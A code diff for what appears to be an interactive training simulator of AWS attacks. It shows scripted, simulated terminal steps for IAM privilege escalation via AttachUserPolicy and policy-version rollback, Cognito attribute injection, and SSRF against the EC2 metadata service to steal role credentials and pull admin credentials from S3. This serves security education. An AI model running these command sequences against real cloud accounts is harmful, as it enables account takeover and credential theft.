+function mkIAM(){const u=$('iam-u').value.trim();const p=$('iam-pol').value;if(!u){$('iam-u').classList.add('err');$('iam-u-e').classList.add('vis');return}$('iam-u').classList.remove('err');$('iam-u-e').classList.remove('vis');if(!p){toast('Select a policy','warning');return}if(p!=='AdministratorAccess'){$('iam-pol-e').classList.add('vis');const m={PowerUserAccess:'PowerUserAccess explicitly excludes IAM management. You won\'t be able to enumerate policies, modify permissions, or execute the rollback attack. The first attack module will fail immediately.',ReadOnlyAccess:'ReadOnlyAccess only permits read operations. You cannot create users, modify policies, or interact with compute/serverless resources. Every attack step will return AccessDeniedException.'};$('iam-pol-em').textContent=m[p]||'Insufficient.';toast('Wrong policy — will fail during attacks','error');const t='t42';$(t).innerHTML='';aL(t,`aws iam create-user --user-name ${u}`,'cmd');aL(t,'','out');aL(t,sj({User:{UserName:u,Arn:`arn:aws:iam::012345678901:user/${u}`}}),'out');aL(t,'','out');aL(t,`aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/${p}`,'cmd');aL(t,'','out');aL(t,`Policy "${p}" attached — but this will be insufficient for the workshop`,'inf');return}$('iam-pol-e').classList.remove('vis');$('adm-w').style.display='block';const t='t42';$(t).innerHTML='';aL(t,`aws iam create-user --user-name ${u}`,'cmd');aL(t,'','out');aL(t,sj({User:{UserName:u,Arn:`arn:aws:iam::012345678901:user/${u}`}}),'out');aL(t,'','out');aL(t,`aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`,'cmd');aL(t,'','out');aL(t,`User "${u}" created with AdministratorAccess`,'ok');toast(`User "${u}" created`,'success');setTimeout(()=>nav('4.3'),1200)}
+
+const CLIP=[{p:'AWS Access Key ID [None]: ',h:'AKIAIOSFODNN7EXAMPLE'},{p:'AWS Secret Access Key [None]: ',h:'wJalrXUtnFEMI/K7MDENG/bPxRfi'},{p:'Default region name [None]: ',h:'us-east-1',v:v=>{if(v&&!/^[a-z]{2}-(east|west|north|south|central|northeast|southeast)-\d$/.test(v))return'Invalid region. Use format: us-east-1';return null}},{p:'Default output format [None]: ',h:'json',v:v=>{if(v&&!['json','table','text','yaml'].includes(v))return'Invalid format. Use: json, table, text, or yaml';return null}}];
+function initCLI(){$('t43').innerHTML='';S.cliStep=0;aL('t43','aws configure','cmd');pCLI()}
+function pCLI(){if(S.cliStep>=CLIP.length){fCLI();return}const p=CLIP[S.cliStep];$('cli-hc').textContent=p.h;aP('t43',p.p,p.h,v=>{if(p.v){const e=p.v(v);if(e){aL('t43',e,'err');pCLI();return}}S.cliStep++;pCLI()},p.h)}
+function cliHint(){const ins=$$('#t43 .tpi:not(:disabled)');if(ins.length){ins[ins.length-1].value=CLIP[S.cliStep]?.h||'';ins[ins.length-1].focus()}}
+async function fCLI(){$('cli-h').style.display='none';aL('t43','','out');aL('t43','Saved to ~/.aws/credentials','ok');await dly(600);aL('t43','','out');aP('t43','$ ','aws sts get-caller-identity',async()=>{aL('t43','','out');await tL('t43','Verifying...','inf',25);await dly(800);aL('t43','','out');aL('t43',sj({UserId:'AIDAIOSFODNN7EXAMPLE',Account:'012345678901',Arn:'arn:aws:iam::012345678901:user/iamadmin'}),'out');aL('t43','','out');aL('t43','Identity confirmed — AKIA prefix = permanent IAM user key','ok');toast('CLI configured','success');setTimeout(()=>nav('5.1'),1200)},'aws sts get-caller-identity')}
+
+async function runSetup(){const t='t51';$(t).innerHTML='';await tL(t,'git clone https://github.com/RhinoSecurityLabs/cloudgoat.git','cmd',10);aL(t,'Cloning...','out');await dly(800);aL(t,'done.','out');aL(t,'','out');await tL(t,'pip install -r requirements.txt','cmd',10);await dly(600);aL(t,'Installed boto3...','out');aL(t,'','out');await tL(t,'cloudgoat create iam_privesc_by_rollback','cmd',10);await dly(1200);aL(t,'Applying Terraform...','inf');await dly(1500);aL(t,'Lab deployed','ok');toast('Lab ready','success');setTimeout(()=>nav('5.2'),1200)}
+
+function initTZ(){const t='t53';$(t).innerHTML='';aL(t,'aws sts get-caller-identity','cmd');aL(t,'','out');aL(t,'An error occurred (SignatureDoesNotMatch) when calling GetCallerIdentity: Signature expired','err');aL(t,'','out');aL(t,'Clock is out of sync — SigV4 timestamp rejected','inf')}
+
+const RCMDS=[{c:'aws sts get-caller-identity --profile raynor',h:'aws sts get-caller-identity --profile raynor'},{c:'aws iam list-attached-user-policies --user-name raynor-iam_privesc_by_rollback',h:'aws iam list-attached-user-policies ...'},{c:'aws iam list-policy-versions --policy-arn arn:aws:iam::012345678901:policy/cg-raynor-policy',h:'aws iam list-policy-versions ...'},{c:'aws iam get-policy-version --policy-arn arn:aws:iam::012345678901:policy/cg-raynor-policy --version-id v1',h:'aws iam get-policy-version ... --version-id v1'}];
+// ═══ ATTACK 1: IAM AttachUserPolicy ═══
+const A1CMDS=[
+  {c:'aws sts get-caller-identity',h:'aws sts get-caller-identity'},
+  {c:'aws iam list-attached-user-policies --user-name dev-user',h:'aws iam list-attached-user-policies ...'},
+  {c:'aws iam attach-user-policy --user-name dev-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',h:'aws iam attach-user-policy ... AdministratorAccess'},
 ];
-function initA1D(){$('t-a1d').innerHTML='';S.a1s=0;['a1f1','a1f2','a1f3'].forEach(f=>{$(f).style.opacity='0';$(f).style.transform='translateY(8px)'});$('a1-next').disabled=true;pA1()}
-function pA1(){if(S.a1s>=A1C.length){$('a1h').style.display='none';return}$('a1hc').textContent=A1C[S.a1s].h;aP('t-a1d','$ ',A1C[S.a1s].h,async()=>{await doA1(S.a1s);S.a1s++;pA1()},A1C[S.a1s].c)}
-function a1Hint(){const ins=$$('#t-a1d .tpi:not(:disabled)');if(ins.length){ins[ins.length-1].value=A1C[S.a1s]?.c||'';ins[ins.length-1].focus()}}
-async function doA1(n){const t='t-a1d';aL(t,'','out');
+function initAtk1(){$('t71b').innerHTML='';S.a1Step=0;['a1f1','a1f2','a1f3'].forEach(f=>{$(f).style.opacity='0';$(f).style.transform='translateY(8px)'});$('a1-fb').classList.remove('vis');$('a1-next').disabled=true;const w=$('a1-why');if(w)w.classList.remove('vis');pA1()}
+function pA1(){if(S.a1Step>=A1CMDS.length){$('a1h').style.display='none';return}$('a1hc').textContent=A1CMDS[S.a1Step].h;aP('t71b','$ ',A1CMDS[S.a1Step].h,async()=>{await doA1(S.a1Step);S.a1Step++;pA1()},A1CMDS[S.a1Step].c)}
+function a1Hint(){const ins=$$('#t71b .tpi:not(:disabled)');if(ins.length){ins[ins.length-1].value=A1CMDS[S.a1Step]?.c||'';ins[ins.length-1].focus()}}
+async function doA1(n){const t='t71b';aL(t,'','out');
 if(n===0){await dly(500);aL(t,sj({UserId:'AIDADEVUSER7EXAMPLE',Account:'012345678901',Arn:'arn:aws:iam::012345678901:user/dev-user'}),'out');$('a1f1').style.opacity='1';$('a1f1').style.transform='none';toast('Identity: dev-user','info')}
-else if(n===1){await dly(600);aL(t,sj({AttachedPolicies:[{PolicyName:'dev-app-policy',PolicyArn:'arn:aws:iam::012345678901:policy/dev-app-policy'}]}),'out');$('a1f2').style.opacity='1';$('a1f2').style.transform='none';toast('Policy found — reading it...','info')}
-else if(n===2){await dly(600);aL(t,sj({PolicyVersion:{Document:{Statement:[{Effect:'Allow',Action:['s3:GetObject','s3:PutObject'],Resource:'arn:aws:s3:::dev-app-bucket/*'},{Effect:'Allow',Action:'iam:AttachUserPolicy',Resource:'*'}]}}}),'out');aL(t,'','out');aL(t,'FOUND: iam:AttachUserPolicy on Resource: *','alrt');$('a1f3').style.opacity='1';$('a1f3').style.transform='none';$('a1-next').disabled=false;toast('Meta-permission found!','error')}
+else if(n===1){await dly(600);aL(t,sj({AttachedPolicies:[{PolicyName:'dev-app-policy',PolicyArn:'arn:aws:iam::012345678901:policy/dev-app-policy'}]}),'out');aL(t,'','out');aL(t,'Checking policy document...','inf');await dly(400);aL(t,'','out');aL(t,sj({Statement:[{Effect:'Allow',Action:['s3:GetObject','s3:PutObject'],Resource:'arn:aws:s3:::dev-app-bucket/*'},{Effect:'Allow',Action:'iam:AttachUserPolicy',Resource:'*'}]}),'out');aL(t,'','out');aL(t,'FOUND: iam:AttachUserPolicy on Resource: * — meta-permission!','alrt');$('a1f2').style.opacity='1';$('a1f2').style.transform='none';toast('Meta-permission found!','warning')}
+else if(n===2){await dly(800);aL(t,'','out');aL(t,'Policy attached successfully.','ok');aL(t,'','out');aL(t,'Verifying...','inf');await dly(600);aL(t,'','out');aL(t,'aws iam list-attached-user-policies --user-name dev-user','cmd');await dly(400);aL(t,'','out');aL(t,sj({AttachedPolicies:[{PolicyName:'dev-app-policy'},{PolicyName:'AdministratorAccess'}]}),'out');aL(t,'','out');aL(t,'dev-user is now FULL ADMIN — one API call','alrt');$('a1f3').style.opacity='1';$('a1f3').style.transform='none';$('a1-fb').classList.add('vis');showWhy('a1-why');$('a1-next').disabled=false;toast('Full admin achieved!','error')}
 aL(t,'','out')}
 
-// ═══ ATTACK 1: ESCALATION ═══
-async function runA1Esc(){const t='t-a1e';$(t).innerHTML='';
-await tL(t,'aws iam attach-user-policy --user-name dev-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess','cmd',10);
-aL(t,'','out');await dly(1000);aL(t,'Policy attached.','ok');aL(t,'','out');
-await tL(t,'aws iam list-attached-user-policies --user-name dev-user','cmd',12);aL(t,'','out');await dly(600);
-aL(t,sj({AttachedPolicies:[{PolicyName:'dev-app-policy'},{PolicyName:'AdministratorAccess'}]}),'out');
-aL(t,'','out');aL(t,'dev-user is now FULL ADMIN','alrt');
-$('a1-fb').classList.add('vis');$('a1e-next').disabled=false;toast('Full admin!','error')}
+// ═══ ATTACK 2: Policy Version Rollback ═══
+function initRecon(){$('t72').innerHTML='';S.reconStep=0;['f1','f2','f3','f4'].forEach(f=>{$(f).style.opacity='0';$(f).style.transform='translateY(8px)'});$('b73').disabled=true;const w=$('why-recon');if(w)w.classList.remove('vis');pR()}
+function pR(){if(S.reconStep>=RCMDS.length){$('rh').style.display='none';$('b73').disabled=false;showWhy('why-recon');toast('Critical: v1 has full admin access','error');return}$('rhc').textContent=RCMDS[S.reconStep].h;aP('t72','$ ',RCMDS[S.reconStep].h,async()=>{await doR(S.reconStep);S.reconStep++;pR()},RCMDS[S.reconStep].c)}
+function rHint(){const ins=$$('#t72 .tpi:not(:disabled)');if(ins.length){ins[ins.length-1].value=RCMDS[S.reconStep]?.c||'';ins[ins.length-1].focus()}}
+async function doR(n){const t='t72';aL(t,'','out');if(n===0){await dly(500);aL(t,sj({UserId:'AIDARAYNOR7EXAMPLE',Account:'012345678901',Arn:'arn:aws:iam::012345678901:user/raynor-iam_privesc_by_rollback'}),'out');$('f1').style.opacity='1';$('f1').style.transform='none';toast('User identified','info')}else if(n===1){await dly(600);aL(t,sj({AttachedPolicies:[{PolicyName:'cg-raynor-policy',PolicyArn:'arn:aws:iam::012345678901:policy/cg-raynor-policy'}]}),'out');$('f2').style.opacity='1';$('f2').style.transform='none';toast('Policy found','info')}else if(n===2){await dly(600);aL(t,sj({Versions:[{VersionId:'v5',IsDefaultVersion:true},{VersionId:'v4',IsDefaultVersion:false},{VersionId:'v3',IsDefaultVersion:false},{VersionId:'v2',IsDefaultVersion:false},{VersionId:'v1',IsDefaultVersion:false}]}),'out');$('f3').style.opacity='1';$('f3').style.transform='none';toast('5 versions — checking each one','warning')}else if(n===3){await dly(800);aL(t,sj({PolicyVersion:{Document:{Statement:[{Effect:'Allow',Action:'*',Resource:'*'}]},VersionId:'v1'}}),'out');aL(t,'','out');aL(t,'CRITICAL: v1 = Action:* Resource:*','alrt');$('f4').style.opacity='1';$('f4').style.transform='none'}aL(t,'','out')}
 
-// ═══ ATTACK 2: DISCOVERY ═══
-const A2C=[
-{c:'aws sts get-caller-identity --profile raynor',h:'aws sts get-caller-identity --profile raynor'},
-{c:'aws iam list-policy-versions --policy-arn arn:aws:iam::012345678901:policy/cg-raynor-policy',h:'aws iam list-policy-versions ...'},
-{c:'aws iam get-policy-version --policy-arn arn:aws:iam::012345678901:policy/cg-raynor-policy --version-id v1',h:'aws iam get-policy-version ... --version-id v1'}
-];
-function initA2D(){$('t-a2d').innerHTML='';S.a2s=0;['a2f1','a2f2','a2f3'].forEach(f=>{$(f).style.opacity='0';$(f).style.transform='translateY(8px)'});$('a2-next').disabled=true;pA2()}
-function pA2(){if(S.a2s>=A2C.length){$('a2h').style.display='none';return}$('a2hc').textContent=A2C[S.a2s].h;aP('t-a2d','$ ',A2C[S.a2s].h,async()=>{await doA2(S.a2s);S.a2s++;pA2()},A2C[S.a2s].c)}
-function a2Hint(){const ins=$$('#t-a2d .tpi:not(:disabled)');if(ins.length){ins[ins.length-1].value=A2C[S.a2s]?.c||'';ins[ins.length-1].focus()}}
-async function doA2(n){const t='t-a2d';aL(t,'','out');
-if(n===0){await dly(500);aL(t,sj({UserId:'AIDARAYNOR7EXAMPLE',Account:'012345678901',Arn:'arn:aws:iam::012345678901:user/raynor-iam_privesc_by_rollback'}),'out');$('a2f1').style.opacity='1';$('a2f1').style.transform='none';toast('User: raynor','info')}
-else if(n===1){await dly(600);aL(t,sj({Versions:[{VersionId:'v5',IsDefaultVersion:true},{VersionId:'v4',IsDefaultVersion:false},{VersionId:'v3',IsDefaultVersion:false},{VersionId:'v2',IsDefaultVersion:false},{VersionId:'v1',IsDefaultVersion:false}]}),'out');$('a2f2').style.opacity='1';$('a2f2').style.transform='none';toast('5 versions — checking v1','warning')}
-else if(n===2){await dly(800);aL(t,sj({PolicyVersion:{Document:{Statement:[{Effect:'Allow',Action:'*',Resource:'*'}]},VersionId:'v1'}}),'out');aL(t,'','out');aL(t,'v1 = Action: *, Resource: * — full admin, never deleted','alrt');$('a2f3').style.opacity='1';$('a2f3').style.transform='none';$('a2-next').disabled=false;toast('v1 has full admin!','error')}
-aL(t,'','out')}
+function initEsc(){$('eb').classList.remove('vis');$('ec').classList.remove('vis');$('b74').disabled=true;$('t73').innerHTML='';$('ve').classList.remove('vis');$$('#vsel .ocard').forEach(c=>c.classList.remove('sel','wrong'));$('ei').value='';$('be').disabled=true;$('ei').disabled=false;$('ei').oninput=function(){$('be').disabled=this.value.trim().toUpperCase()!=='ESCALATE'}}
 
-// ═══ ATTACK 2: ROLLBACK ═══
-function initA2E(){$('a2-fb').classList.remove('vis');$('ec').classList.remove('vis');$('a2e-next').disabled=true;$('t-a2e').innerHTML='';$('ve').classList.remove('vis');$$('#vsel .ocard').forEach(c=>c.classList.remove('sel','wrong'));$('ei').value='';$('be').disabled=true;$('ei').disabled=false;$('a2-why').classList.remove('vis');$('ei').oninput=function(){$('be').disabled=this.value.trim().toUpperCase()!=='ESCALATE'}}
-function pkV(el,v){$$('#vsel .ocard').forEach(c=>c.classList.remove('sel','wrong'));$('t-a2e').innerHTML='';
-if(v!=='v1'){el.classList.add('wrong');const p=VPOL[v];
-aL('t-a2e',`aws iam set-default-policy-version --policy-arn ...cg-raynor-policy --version-id ${v}`,'cmd');aL('t-a2e','','out');aL('t-a2e','Default changed to '+v,'ok');aL('t-a2e','','out');
-aL('t-a2e',sj({PolicyVersion:{Document:{Statement:[{Effect:'Allow',Action:p.a,Resource:'*'}]},VersionId:v}}),'out');aL('t-a2e','','out');
-if(v==='v5'){aL('t-a2e','Already the default. No change.','inf')}
-else{aL('t-a2e',`Permissions now: ${p.a.join(', ')}. No IAM admin.`,'inf');aL('t-a2e','','out');aL('t-a2e','aws iam get-user --user-name raynor','cmd');aL('t-a2e','','out');aL('t-a2e',`AccessDeniedException: User is not authorized to perform: iam:GetUser (policy ${v} grants ${p.a[0]})`,'err')}
-$('vem').innerHTML=`<strong>${v}</strong>: ${p.d}<br><br>The rollback API call succeeded, but the resulting permissions are insufficient for escalation.`;
-$('ve').classList.add('vis');$('ec').classList.remove('vis');toast(`${v}: insufficient`,'warning');return}
-el.classList.add('sel');$('ve').classList.remove('vis');$('ec').classList.add('vis');$('ei').focus()}
-async function doEsc(){$('ei').disabled=true;$('be').disabled=true;const t='t-a2e';$(t).innerHTML='';
-await tL(t,'aws iam set-default-policy-version --policy-arn ...cg-raynor-policy --version-id v1','cmd',10);aL(t,'','out');await tL(t,'Processing...','inf',25);await dly(1200);aL(t,'','out');aL(t,'Default changed to v1','ok');aL(t,'','out');
-aL(t,'aws iam get-user --user-name raynor','cmd');await dly(400);aL(t,'','out');aL(t,sj({User:{UserName:'raynor',Arn:'arn:aws:iam::012345678901:user/raynor-iam_privesc_by_rollback'}}),'out');aL(t,'','out');
-aL(t,'PRIVILEGE ESCALATED — v1 active: Action *, Resource *','alrt');
-$('a2-fb').classList.add('vis');showW('a2-why');$('a2e-next').disabled=false;toast('Escalated!','error')}
+function pkV(el,v){
+  $$('#vsel .ocard').forEach(c=>c.classList.remove('sel','wrong'));
+  $('t73').innerHTML=''; // Clear terminal for each attempt
+  if(v!=='v1'){
+    el.classList.add('wrong');
+    const pol=VPOLICIES[v];
+    // Show what this version actually contains
+    aL('t73',`aws iam set-default-policy-version --policy-arn ...cg-raynor-policy --version-id ${v}`,'cmd');
+    aL('t73','','out');
+    aL('t73','Default policy version changed to '+v,'ok');
+    aL('t73','','out');
+    aL('t73','Checking new permissions...','inf');
+    aL('t73','','out');
+    aL('t73',sj({PolicyVersion:{Document:{Statement:[{Effect:'Allow',Action:pol.actions,Resource:'*'}]},VersionId:v}}),'out');
+    aL('t73','','out');
+    if(v==='v5'){
+      aL('t73','Already the default. No escalation possible.','inf');
+    } else {
+      aL('t73',`Permissions changed to: ${pol.actions.join(', ')}. No IAM admin capability.`,'inf');
+      aL('t73','','out');
+      // Show what happens when you try to use the limited perms
+      aL('t73','aws iam get-user --user-name raynor-iam_privesc_by_rollback','cmd');
+      aL('t73','','out');
+      aL('t73',`An error occurred (AccessDeniedException) when calling the GetUser operation: User is not authorized to perform: iam:GetUser (current policy: ${v} grants ${pol.actions[0]})`, 'err');
+    }
+    $('vem').innerHTML=`<strong>${pol.name}</strong><br><br>${pol.desc}<br><br>Actions: <code>${pol.actions.join('</code>, <code>')}</code><br><br>The rollback itself succeeded (SetDefaultPolicyVersion always works if you have the permission), but the resulting permissions are insufficient. You need <code>Action: "*"</code>.`;
+    $('ve').classList.add('vis');
+    $('ec').classList.remove('vis');
+    toast(`${v}: ${pol.actions[0]} — insufficient`,'warning');
+    return;
+  }
+  el.classList.add('sel');
+  $('ve').classList.remove('vis');
+  $('ec').classList.add('vis');
+  $('ei').focus();
+}
 
-// ═══ ATTACK 3: COGNITO ═══
-async function runA3(){const t='t-a3';$(t).innerHTML='';
-aL(t,'# Step 1: Get an identity ID (no auth required)','inf');aL(t,'','out');
-await tL(t,'aws cognito-identity get-id --identity-pool-id us-east-1:a1b2c3d4-e5f6-7890-dead-beefcafe1234','cmd',8);aL(t,'','out');await dly(800);
-aL(t,sj({IdentityId:'us-east-1:f1e2d3c4-b5a6-7890-cafe-deadbeef9876'}),'out');aL(t,'','out');
-aL(t,'# Step 2: Get AWS credentials (still no auth)','inf');aL(t,'','out');
-await tL(t,'aws cognito-identity get-credentials-for-identity --identity-id us-east-1:f1e2d3c4-b5a6-7890-cafe-deadbeef9876','cmd',8);aL(t,'','out');await dly(1000);
-aL(t,sj({Credentials:{AccessKeyId:'ASIAZ3UNAUTH7EXAMPLE',SecretAccessKey:'wJalr+UnauthCognito/K7MDENG/bPxRfi',SessionToken:'IQoJb3JpZ2lu...truncated',Expiration:'2024-03-15T18:30:00Z'}}),'out');aL(t,'','out');
-aL(t,'AWS credentials obtained — ZERO authentication','alrt');aL(t,'','out');
-aL(t,'# Step 3: What can this role do?','inf');aL(t,'','out');
-await tL(t,'aws sts get-caller-identity','cmd',12);await dly(600);aL(t,'','out');
-aL(t,sj({UserId:'AROAUNAUTH:CognitoIdentityCredentials',Account:'012345678901',Arn:'arn:aws:sts::012345678901:assumed-role/Cognito_UnauthRole/CognitoIdentityCredentials'}),'out');aL(t,'','out');
-await tL(t,'aws s3 ls','cmd',15);await dly(600);aL(t,'','out');
-aL(t,'2024-03-15 09:12:01 company-internal-data','out');aL(t,'2024-03-15 09:12:01 company-backups','out');aL(t,'2024-03-15 09:12:01 user-uploads','out');aL(t,'','out');
-aL(t,'Unauth role has S3 read access across the account','alrt');
-$('a3-creds').classList.add('vis');$('a3-next').disabled=false;toast('Credentials obtained — zero auth!','error')}
+async function doEsc(){$('ei').disabled=true;$('be').disabled=true;const t='t73';$(t).innerHTML='';await tL(t,'aws iam set-default-policy-version --policy-arn ...cg-raynor-policy --version-id v1','cmd',10);aL(t,'','out');await tL(t,'Processing...','inf',25);await dly(1200);aL(t,'','out');aL(t,'Default changed to v1','ok');aL(t,'','out');aL(t,'Verifying new access level...','inf');await dly(600);aL(t,'','out');aL(t,'aws iam get-user --user-name raynor-iam_privesc_by_rollback','cmd');await dly(400);aL(t,'','out');aL(t,sj({User:{UserName:'raynor-iam_privesc_by_rollback',Arn:'arn:aws:iam::012345678901:user/raynor-iam_privesc_by_rollback'}}),'out');aL(t,'','out');aL(t,'PRIVILEGE ESCALATED — Action:* Resource:*','alrt');$('eb').classList.add('vis');showWhy('why-esc');$('b74').disabled=false;toast('Escalated to full admin!','error')}
 
-// ═══ KILL CHAIN ═══
-async function initKC(){$$('#kc .kcp').forEach(p=>p.classList.remove('vis'));const ps=$$('#kc .kcp');for(let i=0;i<ps.length;i++){await dly(600);ps[i].classList.add('vis')}}
+function cogP(n){$$('[data-id="7.4"] .ptab').forEach((t,i)=>t.classList.toggle('act',i===n-1));$$('[data-id="7.4"] .pcont').forEach((c,i)=>c.classList.toggle('act',i===n-1))}
+async function cogSign(){const e=$('ce').value.trim()||'attacker@evil.com';const t='tc1';$(t).innerHTML='';await tL(t,`aws cognito-idp sign-up --client-id 4a3g... --username ${e}`,'cmd',8);aL(t,'','out');await dly(600);aL(t,sj({UserConfirmed:false,UserSub:'a1b2c3d4-...'}),'out');aL(t,'','out');aL(t,'Email validation bypassed — registered via CLI','ok');toast('Bypass successful','success');await dly(1200);cogP(2)}
 
-buildSB();buildScreens();nav('title');
+async function cogInj(){
+  const a=$('cat').value;const v=$('cav').value.trim()||'admin';
+  if(!a){toast('Select attribute','warning');return}
+  const t='tc2';$(t).innerHTML='';
+  // Always show the update command succeeding (it does succeed in AWS)
+  await tL(t,`aws cognito-idp update-user-attributes --access-token eyJ... --user-attributes '[{"Name":"${a}","Value":"${v}"}]'`,'cmd',7);
+  aL(t,'','out');await dly(600);
+  aL(t,`Attribute ${a} set to "${v}"`,a==='custom:access'&&v==='admin'?'ok':'inf');
+  aL(t,'','out');
+  // Now check if it actually helps
+  aL(t,'Testing credential extraction with Identity Pool...','inf');
+  await dly(800);
+  if(a==='email_verified'){
+    aL(t,'','out');aL(t,'Identity Pool returned: unauthenticated role (minimal permissions)','err');
+    aL(t,'','out');aL(t,'email_verified is a standard attribute for email confirmation.','inf');aL(t,'The Identity Pool role mapping checks custom:access, not email_verified.','inf');
+    $('caem').textContent='The attribute update succeeded (AWS allows it), but the Identity Pool\'s role mapping rule checks custom:access, not email_verified. Your authorization level did not change.';
+    $('cae').classList.add('vis');toast('No privilege change','error');return;
+  }
+  if(a==='custom:role'){
+    aL(t,'','out');aL(t,'Identity Pool returned: unauthenticated role (minimal permissions)','err');
+    aL(t,'','out');aL(t,'custom:role exists as an attribute but is not referenced in any role-mapping rule.','inf');
+    $('caem').textContent='The Identity Pool configuration maps roles based on custom:access, not custom:role. This attribute exists but has no effect on authorization.';
+    $('cae').classList.add('vis');toast('Wrong attribute — not in role mapping','error');return;
+  }
+  if(a==='custom:access'&&v.toLowerCase()!=='admin'){
+    aL(t,'','out');aL(t,`Identity Pool returned: read-only role (value "${v}" matched default rule)`,'err');
+    aL(t,'','out');aL(t,`Role mapping: custom:access == "admin" → AdminRole. Value "${v}" doesn't match.`,'inf');
+    $('caem').textContent=`The role mapping rule requires exact match: custom:access == "admin". Value "${v}" fell through to the default rule, which maps to a read-only role.`;
+    $('cae').classList.add('vis');toast(`"${v}" → wrong role mapping`,'error');return;
+  }
+  $('cae').classList.remove('vis');
+  aL(t,'','out');aL(t,'Identity Pool returned: AdminRole credentials','ok');
+  aL(t,'custom:access = admin → matched AdminRole mapping rule','alrt');
+  toast('Admin attribute accepted!','error');await dly(1200);cogP(3);
+}
+
+async function cogExt(){const t='tc3';$(t).innerHTML='';await tL(t,'aws cognito-identity get-credentials-for-identity ...','cmd',10);aL(t,'','out');await dly(1000);aL(t,sj({Credentials:{AccessKeyId:'ASIAZ3EXAMPLE7COGNITO',SecretKey:'wJalr+CognitoTemp/K7MDENG',Expiration:'2024-03-15T18:30:00Z'}}),'out');aL(t,'','out');aL(t,'Note: ASIA prefix = temporary STS-issued credentials','inf');aL(t,'','out');aL(t,'Temp AWS credentials obtained via Cognito','alrt');$('ccr').classList.add('vis');$('b80').disabled=false;toast('Credentials extracted','error')}
+
+const SSRFS=[{u:'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/',d:'Query metadata root'},{u:'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',d:'Discover IAM role'},{u:'http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cloud_breach_s3_cgid',d:'Extract credentials'},{u:'aws s3 cp s3://cg-secret-s3-bucket-cgid/admin-credentials.txt ./ --profile stolen',d:'Download from S3'}];
+function initSSRF(){$('t81').innerHTML='';S.ssrfStep=0;$$('#sc .cn').forEach(n=>n.classList.remove('vis'));$$('#sc .ca').forEach(a=>a.classList.remove('vis'));$('b90').disabled=false;$('su').value=SSRFS[0].u;updSSRF();$('sb').style.opacity='1';$('sb').style.pointerEvents='auto'}
+function updSSRF(){const s=SSRFS[S.ssrfStep];if(s){$('ssn').textContent=S.ssrfStep+1;$('ssd').textContent=s.d}}
+async function doSSRF(){
+  const url=$('su').value.trim();if(!url){toast('Enter URL','warning');return}
+  $('se').classList.remove('vis');const st=S.ssrfStep;
+  // Wrong URL handling with specific responses
+  if(st<3){
+    if(url.match(/^https?:\/\/169\.254\.169\.254/) && !url.includes('54.234.112.87')){
+      const t='t81';aL(t,`curl "${url}"`,'cmd');aL(t,'','out');aL(t,'curl: (7) Failed to connect to 169.254.169.254 port 80: Connection refused','err');
+      $('sem').textContent='169.254.169.254 is a link-local address only accessible from within the EC2 instance. You\'re outside — you need the web app\'s SSRF to proxy your request through the instance.';
+      $('sef').textContent='Wrap the metadata URL in the ?url= parameter: http://54.234.112.87/?url=http://169.254.169.254/...';
+      $('se').classList.add('vis');toast('Cannot reach IMDS directly','error');return;
+    }
+    if(url.includes('54.234.112.87')&&url.includes('user-data')){
+      const t='t81';aL(t,`curl "${url}"`,'cmd');aL(t,'','out');aL(t,'#!/bin/bash\napt-get update\napt-get install -y nginx python3-pip','out');
+      $('sem').textContent='user-data contains the instance startup script. Interesting for recon (reveals installed software), but credentials are under /meta-data/iam/security-credentials/.';
+      $('sef').textContent='Change the path to: /latest/meta-data/iam/security-credentials/';
+      $('se').classList.add('vis');toast('Startup script — not credentials','warning');return;
+    }
+    if(url.includes('54.234.112.87')&&url.includes('instance-id')){
+      const t='t81';aL(t,`curl "${url}"`,'cmd');aL(t,'','out');aL(t,'i-0abc123def456789','out');
+      $('sem').textContent='That\'s the instance ID. Useful for recon but doesn\'t reveal credentials.';
+      $('sef').textContent='Navigate to /iam/security-credentials/ to find the role name.';
+      $('se').classList.add('vis');toast('Instance ID — not credentials','warning');return;
+    }
+    if(!url.includes('169.254.169.254')&&!url.includes('54.234.112.87')&&url.match(/^https?:\/\//)){
+      const t='t81';aL(t,`curl "${url}"`,'cmd');aL(t,'','out');aL(t,'<html><head><title>External Site</title></head>...truncated...','out');
+      $('sem').textContent='The SSRF works (the app fetched an external URL), confirming the vulnerability. But we want internal resources — specifically the IMDS at 169.254.169.254.';
+      $('sef').textContent='Use: http://54.234.112.87/?url=http://169.254.169.254/latest/meta-data/';
+      $('se').classList.add('vis');toast('External URL — confirms SSRF but no creds','info');return;
+    }
+  }
+  const t='t81';const ns=$$('#sc .cn');const as=$$('#sc .ca');
+  if(ns[st])ns[st].classList.add('vis');if(st>0&&as[st-1])as[st-1].classList.add('vis');
+  if(st===0){await tL(t,`curl "${url}"`,'cmd',10);aL(t,'','out');await dly(600);aL(t,'ami-id\ninstance-id\niam/','out');aL(t,'','out');aL(t,'Metadata accessible — IMDSv1 has no auth','inf');toast('Metadata reached','info')}
+  else if(st===1){await tL(t,`curl "${url}"`,'cmd',10);aL(t,'','out');await dly(600);aL(t,'cg-ec2-role-cloud_breach_s3_cgid','out');aL(t,'','out');aL(t,'IAM role discovered — now query its credentials','inf');toast('Role found','warning')}
+  else if(st===2){await tL(t,`curl "${url}"`,'cmd',10);aL(t,'','out');await dly(1000);aL(t,sj({Code:'Success',AccessKeyId:'ASIAZ3EXAMPLESSRF01',SecretAccessKey:'wJalr+SSRFstolen/K7MDENG',Token:'IQoJb3J...'}),'out');aL(t,'','out');aL(t,'Role credentials stolen — note ASIA prefix = temporary STS creds','alrt');if(as[st])as[st].classList.add('vis');toast('Credentials stolen!','error')}
+  else if(st===3){await tL(t,url,'cmd',10);aL(t,'','out');await dly(800);aL(t,'download: s3://...admin-credentials.txt → ./','out');aL(t,'','out');aL(t,'Admin credentials exfiltrated from S3','ok');if(ns[4])ns[4].classList.add('vis');if(as[3])as[3].classList.add('vis');toast('Admin creds downloaded','error')}
+  aL(t,'','out');S.ssrfStep++;
+  if(S.ssrfStep<SSRFS.length){$('su').value=SSRFS[S.ssrfStep].u;updSSRF()}
+  else{$('sb').style.opacity='.4';$('sb').style.pointerEvents='none';$('ssd').textContent='Complete'}
+}
+
+function pkLR(el,r){
